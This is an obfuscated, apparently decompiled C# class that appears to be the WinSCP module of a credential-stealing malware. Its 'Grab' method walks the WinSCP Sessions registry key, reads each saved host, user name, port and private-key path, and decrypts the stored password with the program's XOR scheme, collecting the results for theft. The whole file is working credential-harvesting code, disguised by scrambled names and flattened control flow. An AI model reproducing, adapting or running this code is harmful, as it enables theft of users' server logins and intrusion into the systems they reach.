using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using Microsoft.Win32;
using p3N5Y;

namespace ZAZUx;

public class _1M0hCB : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string P0t
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public _1M0hCB()
	{
		P0t = "WinSCP";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
		try
		{
			string name = "SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions";
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name))
			{
				if (registryKey == null)
				{
					return list;
				}
				string[] subKeyNames = registryKey.GetSubKeyNames();
				foreach (string name2 in subKeyNames)
				{
					using RegistryKey registryKey2 = registryKey.OpenSubKey(name2);
					if (registryKey2 == null)
					{
						continue;
					}
					string text = (string)registryKey2.GetValue("HostName");
					if (!string.IsNullOrEmpty(text))
					{
						string text2 = (string)registryKey2.GetValue("UserName");
						string text3 = wWAcJWP7lT(text2, (string)registryKey2.GetValue("Password"), text);
						string text4 = (string)registryKey2.GetValue("PublicKeyFile");
						text = text + ":" + Convert.ToString((int)registryKey2.GetValue("PortNumber", "22"));
						if (string.IsNullOrEmpty(text3) && !string.IsNullOrEmpty(text4))
						{
							text3 = $"[PRIVATE KEY LOCATION: \"{Uri.UnescapeDataString(text4)}\"]";
						}
						ii68 ii69 = new ii68();
						ii69.byIdLuuGZbL = text;
						ii69.S8v = text2;
						ii69._9H5rP7hg2 = text3;
						ii69.oVAe = "WinSCP";
						list.Add(ii69);
					}
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static int Je9(List<string> _0Zwne)
	{
		int num = 0;
		int result = default;
		int num2 = default;
		int num3 = default;
		do
		{
			if (num == 3)
			{
				result = 0xFF ^ ((((num2 << 4) + num3) ^ 0xA3) & 0xFF);
				num = 4;
			}
			if (num == 2)
			{
				num3 = int.Parse(_0Zwne[1]);
				num = 3;
			}
			if (num == 1)
			{
				num2 = int.Parse(_0Zwne[0]);
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
		return result;
	}

	private static string wWAcJWP7lT(string _2f5M6, string UgGiDGXQ, string vdcnN)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			if (_2f5M6 == string.Empty || UgGiDGXQ == string.Empty || vdcnN == string.Empty)
			{
				return "";
			}
			List<string> list = new List<string>();
			for (int i = 0; i < UgGiDGXQ.Length; i++)
			{
				list.Add(UgGiDGXQ[i].ToString());
			}
			List<string> list2 = new List<string>();
			for (int j = 0; j <= list.Count - 1; j++)
			{
				if (list[j] == "A")
				{
					list2.Add("10");
				}
				if (list[j] == "B")
				{
					list2.Add("11");
				}
				if (list[j] == "C")
				{
					list2.Add("12");
				}
				if (list[j] == "D")
				{
					list2.Add("13");
				}
				if (list[j] == "E")
				{
					list2.Add("14");
				}
				if (list[j] == "F")
				{
					list2.Add("15");
				}
				if ("ABCDEF".IndexOf(list[j]) == -1)
				{
					list2.Add(list[j]);
				}
			}
			List<string> list3 = list2;
			int num2 = 0;
			if (Je9(list3) == 255)
			{
				num2 = Je9(list3);
			}
			list3 = list3.Skip(4).ToList();
			num2 = Je9(list3);
			list3 = list3.Skip(2).ToList();
			int count = Je9(list3) * 2;
			list3 = list3.Skip(count).ToList();
			string text = "";
			for (int k = -1; k <= num2 - 1; k++)
			{
				string text2 = Convert.ToChar(Je9(list3)).ToString();
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				text += text2;
			}
			string text3 = _2f5M6 + vdcnN;
			int count2 = text.IndexOf(text3, StringComparison.Ordinal);
			text = text.Remove(0, count2);
			return text.Replace(text3, "");
		}
		catch
		{
			return "";
		}
	}
}
